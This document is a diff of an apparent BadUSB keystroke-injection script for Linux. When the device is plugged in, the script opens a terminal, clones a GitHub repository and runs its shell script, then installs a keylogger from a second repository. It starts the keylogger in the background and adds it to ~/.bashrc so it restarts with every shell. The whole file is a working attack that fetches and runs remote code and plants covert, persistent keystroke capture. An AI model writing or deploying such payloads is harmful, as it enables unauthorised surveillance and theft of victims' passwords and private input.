@@ -1,33 +1,38 @@
 REM Target: Linux
 ATTACKMODE HID STORAGE
-DELAY 2000
+DELAY 500
 CTRL ALT t
 DELAY 1000
-git clone https://github.com/dad1x/its_villain.git & git clone https://github.com/GiacomoLaw/Keylogger.git
+STRING git clone https://github.com/dad1x/its_villain.git & git clone https://github.com/GiacomoLaw/Keylogger.git
 ENTER
-DELAY 10000
-cd its_villain
-ENTER
-DELAY 1000
-chmod +x ja.sh
+DELAY 2000
+STRING cd its_villain
 ENTER
 DELAY 1000
-./ja.sh
+STRING chmod +x ja.sh
+ENTER
+DELAY 1000
+STRING ./ja.sh
 ENTER
 DELAY 1000
 ALT CTRL t
 DELAY 1000
-cd Keylogger
+STRING cd ~/Keylogger
 ENTER
 DELAY 1000
-pip3 install -r requirements.txt
+STRING cd linux
+ENTER
+STRING pip3 install -r requirements.txt
 ENTER
 DELAY 1000
-nohup python Keylogger.py &
+STRING chmod +x ja.sh
+ENTER
+DELAY 1000
+STRING nohup python keylogger.py &
 ENTER
 ALT CTRL t
 DELAY 1000
-echo "nohup python Keylogger.py &" >> ~/.bashrc
+STRING echo "nohup python keylogger.py &" >> ~/.bashrc
 ENTER
-echo "nohup python Keylogger.py &" >> ~/.bashrc
-ENTER
+
+
